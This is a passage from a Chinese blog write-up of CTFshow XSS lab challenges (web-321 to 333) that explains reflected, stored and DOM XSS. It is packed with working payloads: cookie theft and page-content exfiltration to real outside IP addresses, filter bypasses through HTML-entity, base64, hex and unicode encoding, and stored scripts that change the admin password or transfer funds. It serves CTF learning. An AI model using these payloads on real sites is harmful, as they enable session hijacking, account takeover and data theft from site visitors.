&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web-321"><a href="#web-321" class="headerlink" title="web-321"></a>web-321</h3><p>同320</p><h3 id="web-322"><a href="#web-322" class="headerlink" title="web-322"></a>web-322</h3><p>该题过滤了script，img，iframe，xss，空格，分号，逗号</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/**/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/**/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;body/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;input/**/οnfοcus=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h3><p>同web322</p><p>反射型到这一题应该就截止了，现在讲讲千奇百怪的payload。</p><p>反射型绕过过滤好文：<a href="https://www.freebuf.com/articles/web/340080.html">xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户</a></p><p><strong>1.利用十进制转实体来绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframeWIDTH=0HEIGHT=0srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#46;&amp;#115;&amp;#98;&amp;#47;&amp;#49;&amp;#66;&amp;#113;&amp;#117;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br><span class="line"></span><br><span class="line">&lt;iframe/srcdoc=。。。。。。。。。。&amp;#60;&amp;#115;&amp;#67;&amp;#82;&amp;#105;&amp;#80;&amp;#116;&amp;#32;&amp;#115;&amp;#82;&amp;#67;&amp;#61;&amp;#34;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#120;&amp;#115;&amp;#115;&amp;#46;&amp;#112;&amp;#116;&amp;#47;&amp;#99;&amp;#76;&amp;#103;&amp;#70;&amp;#34;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#67;&amp;#114;&amp;#73;&amp;#112;&amp;#84;&amp;#62;&gt;</span><br></pre></td></tr></table></figure><p>这个<code>&amp;#60</code>其实是十进制的html 实体编码。字符串转十进制的html 实体编码脚本如下：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string_to_html_entities</span>(<span class="params">input_str</span>):</span><br><span class="line">    html_entities = [<span class="string">f&#x27;&amp;#<span class="subst">&#123;<span class="built_in">ord</span>(char)&#125;</span>;&#x27;</span> <span class="keyword">for</span> char <span class="keyword">in</span> input_str]</span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(html_entities)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)</span><br><span class="line">html_entities_result = string_to_html_entities(input_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HTML实体编码:&quot;</span>, html_entities_result)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>&lt;iframe后面的WIDTH和HIGHT其实是设置宽、高等属性，没有也没事</p><p><strong>2.base64编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input οnfοcus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzOC5jYy8ySEpJIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw== autofocus&gt;</span><br></pre></td></tr></table></figure><p>使用atob函数进行base64解码</p><p>除了像这种payload这样用，还能像如下这 些payload这样用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="attr">javascript</span>:<span class="built_in">eval</span>(<span class="title function_">atob</span>(<span class="string">&#x27;SmF5MTc=&#x27;</span>))&gt;test&lt;/a&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(window.atob(</span>&#x27;<span class="attr">SmF5MTc</span>=<span class="string">&#x27;))&gt;test&lt;/a&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="tag"><span class="string">&lt;a href=javascript:eval(window[&#x27;</span><span class="attr">atob</span>&#x27;](&#x27;<span class="attr">SmF5MTc</span>=<span class="string">&#x27;))&gt;test&lt;/a&gt;</span></span></span></span><br><span class="line">&lt;img src=x onmouseover=&quot;eval(window.atob(&#x27;SmF5MTc=&#x27;))&quot;&gt;</span><br><span class="line">&lt;img src=x onerror=&quot;eval(atob(&#x27;SmF5MTc=&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;javascript:eval(window[&#x27;atob&#x27;](&#x27;SmF5MTc=&#x27;))&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>3.混合编码绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x77\x72\x69\x74\x65\x28\x53\x74\x72\x69\x6e\x67\x2e\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65\x28\x36\x30\x2c\x31\x31\x35\x2c\x36\x37\x2c\x31\x31\x34\x2c\x37\x33\x2c\x31\x31\x32\x2c\x31\x31\x36\x2c\x33\x32\x2c\x31\x31\x35\x2c\x31\x31\x34\x2c\x36\x37\x2c\x36\x31\x2c\x34\x37\x2c\x34\x37\x2c\x31\x32\x30\x2c\x31\x31\x35\x2c\x34\x36\x2c\x31\x31\x35\x2c\x39\x38\x2c\x34\x37\x2c\x38\x39\x2c\x38\x34\x2c\x38\x35\x2c\x31\x30\x34\x2c\x36\x32\x2c\x36\x30\x2c\x34\x37\x2c\x31\x31\x35\x2c\x36\x37\x2c\x38\x32\x2c\x31\x30\x35\x2c\x31\x31\x32\x2c\x38\x34\x2c\x36\x32\x29\x29\x3b&quot;)&gt;</span><br></pre></td></tr></table></figure><p>混合编码，加密顺序为先ascii编码加密，再十六进制加密</p><p><a href="http://www.atoolbox.net/Tool.php?Id=816">字符16进制加密&#x2F;解密 - 一个工具箱 - 好用的在线工具都在这里！ (atoolbox.net)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/οnlοad=eval(&quot;\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074\u002E\u0077\u0072\u0069\u0074\u0065\u0028\u0053\u0074\u0072\u0069\u006E\u0067\u002E\u0066\u0072\u006F\u006D\u0043\u0068\u0061\u0072\u0043\u006F\u0064\u0065\u0028\u0036\u0030\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0038\u0032\u002C\u0031\u0030\u0035\u002C\u0038\u0030\u002C\u0031\u0031\u0036\u002C\u0033\u0032\u002C\u0031\u0031\u0035\u002C\u0038\u0032\u002C\u0036\u0037\u002C\u0036\u0031\u002C\u0034\u0037\u002C\u0034\u0037\u002C\u0031\u0032\u0030\u002C\u0031\u0031\u0035\u002C\u0034\u0036\u002C\u0031\u0031\u0035\u002C\u0039\u0038\u002C\u0034\u0037\u002C\u0034\u0039\u002C\u0036\u0036\u002C\u0031\u0031\u0033\u002C\u0031\u0031\u0037\u002C\u0036\u0032\u002C\u0036\u0030\u002C\u0034\u0037\u002C\u0031\u0031\u0035\u002C\u0036\u0037\u002C\u0031\u0031\u0034\u002C\u0037\u0033\u002C\u0031\u0031\u0032\u002C\u0038\u0034\u002C\u0036\u0032\u0029\u0029\u003B&quot;)&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>混合编码，加密顺序为先ascii编码加密，再unicode加密</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025106.png" alt="image-20250423202518061" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025708.png" alt="image-20250423202531675" loading="lazy"></p><h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a><strong>存储型 XSS</strong></h3><p>（1）原理<br>  存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p><p>（2）攻击方式<br>  这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p><h3 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h3><p>(1）原理<br>  文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分</p><p>DOM型xss其实是一种特殊类型的反射型xss，也被称作本地跨站，它是基于DOM文档对象模型的一种漏洞。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情</p><p>DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。</p><p>基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p><p>（2）攻击方式<br>  用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p><h3 id="web-327"><a href="#web-327" class="headerlink" title="web-327"></a>web-327</h3><p>从这题开始就是存储型XSS，首先是poster必须是admin才能发送成功，其次就是xss的出发点一个是sender和content都可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; onload=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040763.png" alt="image-20250423204012730" loading="lazy"></p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040262.png" alt="image-20250423204022238" loading="lazy"></p><h3 id="web-328"><a href="#web-328" class="headerlink" title="web-328"></a>web-328</h3><p>这里在注册时，用户名和密码都用payload（头这里没用了。可能被过滤了）</p><p>打payload前先用vps监听9023端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.cookie)&lt;/script&gt; </span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232044662.png" alt="image-20250423204412630" loading="lazy"></p><p>这个应该是管理员的cookie，抓包伪造一下cookie</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232047133.png" alt="image-20250423204758098" loading="lazy"></p><p>然后放包，一个一个放，速度要慢。放一个包改一次cookie</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232048170.png" alt="image-20250423204843142" loading="lazy"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">别人的wp：</span><br><span class="line">TIP：关于异步(加深了解可写项目或看项目)，页面框架获取和数据拉取填充是异步进行的，不在同一个数据包中，如果通过BURP完成此题，请注意数据包是否为获取指定数据。</span><br><span class="line"></span><br><span class="line">另外一种思路：</span><br><span class="line">将页面指定部分直接发送到XSS平台</span><br><span class="line">经分析，flag大概率在document.body.innerText，且数据量不大</span><br></pre></td></tr></table></figure><h3 id="web-329"><a href="#web-329" class="headerlink" title="web-329"></a>web-329</h3><p>这里还是仅管理员可见</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232053815.png" alt="image-20250423205351783" loading="lazy"></p><p>和上题不同的是，这题cookie会立刻失效，不能通过窃取cookie的形式获得flag</p><p> 我们来分析一下一原理，我们的payload作为存储型XSS，管理员访问的时候能被我们窃取Cookie，你哈是不是还能窃取到别的东西呢，比如管理员看到的用户名和密码。理论上来说是可以的，所以就直接获取管理员的页面信息</p><p>问题在于，我们该如何带出数据？</p><p><strong>方法一：我们可以通过类名查找元素，通过document来获取</strong></p><p>先在vps上面监听端口9023</p><p>innerHTML和outerHTML的区别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.innerHTML</span><br><span class="line">从对象的起始位置到终止位置的全部内容，不包括html标签，innerText柯替代innerHTML</span><br><span class="line"></span><br><span class="line">2.outerHTML</span><br><span class="line">除了包含innerHTML的全部内容外，还包含标签本身</span><br></pre></td></tr></table></figure><p>可以看到前端代码中将要显示admin密码的地方类为layui-table-cell laytable-cell-1-0-1</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232122756.png" alt="image-20250423212222717" loading="lazy"></p><p>payload： （作为账号密码注册后登录）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://120.46.41.173:9023/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>解释一下</p><blockquote><p>window.open(‘<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ + document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML) 这是一个调用 window.open() 函数的语句，用于打开新的浏览器窗口。</p><p>‘<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ 这是一个字符串，表示要打开的网页的 URL。它包括了协议（http:&#x2F;&#x2F;）、主机名（120.46.41.173）和端口号（9023），以及路径（后面的斜杠 &#x2F;）。</p><p>document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’)[1].innerHTML 这是一系列 DOM 操作，用于获取网页中特定元素的内容。</p><p>document.getElementsByClassName(‘layui-table-cell laytable-cell-1-0-1’) 是一个通过类名查找元素的方法。它查找具有类名 ‘layui-table-cell’ 和 ‘laytable-cell-1-0-1’ 的元素，通常这是一种针对表格单元格的选择。</p><p>[1] 表示从匹配的元素列表中选择第二个元素（JavaScript 中的数组索引从 0 开始）。</p><p>.innerHTML 用于获取选定元素的 HTML 内容，也就是在这个表格单元格中显示的文本或 HTML。</p></blockquote><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232126197.png" alt="image-20250423212611169" loading="lazy"></p><p><strong>方法二：jQuery选择器查找类和获取内容</strong></p><p>我们已经得知了我们要获取的数据对应的类名字是layui-table-cell和laytable-cell-1-0-1，对应用户名和密码</p><p>这里我们可以只读一个，也可以都读，都读的话.layui-table-cell.laytable-cell-1-0-1，只读一个的话laytable-cell-1-0-1</p><p>js中indexof()方法返回值在字符串中第一次出现的位置，如果未找到该值，则indexof()方法返回-1，indexof()方法区分大小写</p><p>我们现在控制台测试一下：（能成功获取类和内容就可以了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;</span><br><span class="line">console.log(value);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232151448.png" alt="image-20250423215117393" loading="lazy"></p><p>vps监听9023端口</p><p>payload:（作为账号密码注册后登录）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;)&gt;-1)&#123;window.location.href=&#x27;http://120.46.41.173:9023/&#x27;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解释一下它的每一部分：</p><blockquote><p>$(‘div.layui-table-cell.laytable-cell-1-0-1’).each(function(index, value) { … });<br>这是一个 jQuery 选择器，它查找具有类名 ‘layui-table-cell’、’laytable-cell-1-0-1’ 的 <div> 元素集合，并对每个元素执行一个函数。</p><p>.each(function(index, value) { … })<br>这是 jQuery 的遍历方法，它会遍历匹配的元素集合，并对每个元素执行包含在函数中的操作。在这里，函数接受两个参数，index 表示当前元素在集合中的索引，value 表示当前元素的引用。</p><p>if (value.innerHTML.indexOf(‘ctfshow{‘) &gt; -1) { … }<br>这是在遍历中的条件语句，它检查当前元素的内容是否包含字符串 ‘ctfshow{‘。value.innerHTML 表示当前元素的 HTML 内容，.indexOf(‘ctfshow{‘) 用于查找是否包含 ‘ctfshow{‘，如果包含则返回大于 -1 的索引，否则返回 -1。</p><p>window.location.href &#x3D; ‘<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ + value.innerHTML;<br>如果条件满足，即当前元素的内容包含 ‘ctfshow{‘，则执行这一行代码。它会将浏览器的当前位置重定向到一个新的 URL，这个 URL 是 ‘<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>‘ 加上当前元素的内容。这样就可以在浏览器中打开一个新的页面，新页面的 URL 包含了 ‘ctfshow{‘ 以及其他内容。</p></blockquote><p>这里有点小问题，带出来的内容不是flag，而是payload</p><p>我们分析一下，猜测他确实把第一个用户的密码给了。但是第一个用户是我刚刚注册的那个，就是我的payload，而且我的payload也包含ctfshow{</p><p>验证猜想，我们重新注册了一个号，账号和密码都是ctfshow{i an jay17}，果然，监听的内容就变成了ctfshow{i an jay17}</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241947338.png" alt="image-20250424194749308" loading="lazy"></p><p>所以这题是特殊情况，我们需要改改payload（包含ctfshow{，但是不保护script）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(&#x27;div.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function (index, value) &#123;if ((value.innerHTML.indexOf(&#x27;ctfshow&#123;&#x27;) &gt; -1)&amp;&amp;(value.innerHTML.indexOf(&#x27;script&#x27;) === -1)) &#123;window.location.href = &#x27;http://120.46.41.173:9023/&#x27; +value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>然后就得到flag了</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241956844.png" alt="image-20250424195636798" loading="lazy"></p><p><strong>方法三：querySelector方法获取内容</strong></p><p>quertSelector是JavaScript中用于从文档中选择一个或多个元素的方法，这个方法允许通过CSS选择器来查找并返回文档中匹配该选择器的第一个元素（如果有多个匹配项，则只返回第一个匹配项）</p><p>下面是querySelector方法的解释:</p><p>1.基本语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var element = document.querySelector(selector);</span><br></pre></td></tr></table></figure><p>selector是一个字符串，表示要查找的元素的css选择器</p><p>2.示例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 通过ID选择元素</span><br><span class="line">var elementById = document.querySelector(&#x27;#myId&#x27;);</span><br><span class="line">// 通过类名选择元素</span><br><span class="line">var elementsByClass = document.querySelector(&#x27;.myClass&#x27;);</span><br><span class="line">// 通过标签名选择元素</span><br><span class="line">var elementsByTagName = document.querySelector(&#x27;div&#x27;);</span><br><span class="line">// 使用复杂的选择器，本题就是这种</span><br><span class="line">var complexSelector = document.querySelector(&#x27;div.container &gt; p:first-child&#x27;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242140551.png" alt="image-20250424214045494" loading="lazy"></p><p>payload：其实#top &gt; div.layui-container能把所有源码都读了，很方便</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;var img = new Image();img.src = &quot;http://120.46.41.173:9023/&quot;+document.querySelector(&#x27;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#x27;).textContent;document.body.append(img);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>解释一下它的每一部分</p><blockquote><p>1.var img &#x3D; new Image();</p><p>这行代码创建了一个新的图像元素对象，并将其分配给变量 img。这个对象用于在页面上加载图像。</p><p>2.img.src &#x3D; “<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ + document.querySelector(‘#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main’).textContent;这行代码设置了图像的 src 属性，即要加载的图像的 URL。URL 是通过拼接多个部分构建的：</p><p>​“<a href="http://120.46.41.173:9023/">http://120.46.41.173:9023/</a>“ 是图像的基本 URL。</p><p>​document.querySelector(…) 是一个 DOM 查询操作，用于获取页面上特定元素的内容。在这里，它获取了一个具有复杂选择器的元素，该元素位于页面的某个位置。它的目的是获取这个元素的文本内容。</p><p>​textContent 是获取 DOM 元素文本内容的属性。<br>综合起来，这行代码的目的是获取特定 DOM 元素的文本内容，然后将其添加到图像 URL 的末尾，以便通过 URL 传递给服务器。</p><p>3.document.body.append(img);最后一行代码将创建的图像元素 img 添加到页面的 <body> 元素中，这样图像将被加载并显示在页面上。</p></blockquote><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242148488.png" alt="image-20250424214854454" loading="lazy"></p><p>来自大佬的补充</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 定义sleep函数，转跳，睡眠，接口通信，然而由于机器人不用浏览器未实现，如果是真人则可行</span><br><span class="line">&lt;script&gt;function sleep(numberMillis) &#123;var now = new Date();var exitTime=now.getTime() + numberMillis;while (true) &#123;now = new Date();if (now.getTime() &gt; exitTime)return;&#125;&#125;;window.location.href=&quot;manager.php&quot;;sleep(1000);$(&#x27;.layui-table-cell.laytable-cell-1-0-1&#x27;).each(function(index,value)&#123;if(value.innerHTML.indexOf(&#x27;&#123;&#x27;)&gt;-1)&#123;document.location.href=&#x27;http://xxxxxxxxxxxxxxxxxxxxxxxx/x.php?1=&#x27;+value.innerHTML;&#125;&#125;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;window.open(&#x27;http://60.204.158.87/&#x27;+document.cookie)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="web-330"><a href="#web-330" class="headerlink" title="web-330"></a>web-330</h3><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281930240.png" alt="image-20250428193040147" loading="lazy"></p><p>我们发现多了一个修改密码的功能</p><p>我们先抓包看看有啥功能</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281931091.png" alt="image-20250428193143036" loading="lazy"></p><p>我们可以发现修改密码调用了这个请求，于是可以想到直接通过跳转一个get请求来修改管理员密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;document.location.href=&quot;http://127.0.0.1/api/change.php?p=123456&quot;&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于数据库在本地，所以我们可以直接通过修改本地的密码为123456来达到修改admin密码的目的</p><p>但我们通过实践发现不能，换成用户名试试</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281933114.png" alt="image-20250428193336081" loading="lazy"></p><p>登录成功，然后又是通过抓包获取flag，但这次是第一个包发送过去就能看到flag</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938041.png" alt="image-20250428193810007" loading="lazy"></p><p>反而第二个包发过去看不到了</p><h3 id="web-331"><a href="#web-331" class="headerlink" title="web-331"></a>web-331</h3><p>和上题一样的情况</p><p>同样抓包看看</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938930.png" alt="image-20250428193858896" loading="lazy"></p><p>我们发现发送形式变成POST了，于是对应的payload也变成post形式</p><script>$.ajax(    {        url:'api/change.php',        type:'post',        data:{            p:'123456'        }    })</script><p>通过f12发现可以修改，于是格式化了一下，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&#x27;api/change.php&#x27;,type:&#x27;post&#x27;,data:&#123;p:&#x27;123456&#x27;&#125;&#125;)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281942690.png" alt="image-20250428194212653" loading="lazy"></p><h3 id="web-332"><a href="#web-332" class="headerlink" title="web-332"></a>web-332</h3><p>这次多出了个汇款功能，我们先注册一个账号</p><p>然后转账负数的金额</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281945387.png" alt="image-20250428194535357" loading="lazy"></p><p>就会发现负的太多，余额溢出了变为了正数，然后就能买flag了</p><h3 id="web-333"><a href="#web-333" class="headerlink" title="web-333"></a>web-333</h3><p>管理员访问用户管理，用注册的用户名执行js代码给另一个账户转账，所以需要注册两个用户名</p><p>转账逻辑：</p><p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281947021.png" alt="image-20250428194736988" loading="lazy"></p><p>同样可以通过测试写一个转账逻辑：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">$.ajax(</span><br><span class="line">&#123;</span><br><span class="line">url:&#x27;api/amount.php&#x27;,</span><br><span class="line">type:&#x27;post&#x27;,</span><br><span class="line">data:&#123;</span><br><span class="line">u:&#x27;123&#x27;,</span><br><span class="line">a:&#x27;5&#x27;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">)</span><br><span class="line">&lt;/script&gt;</span><br><span 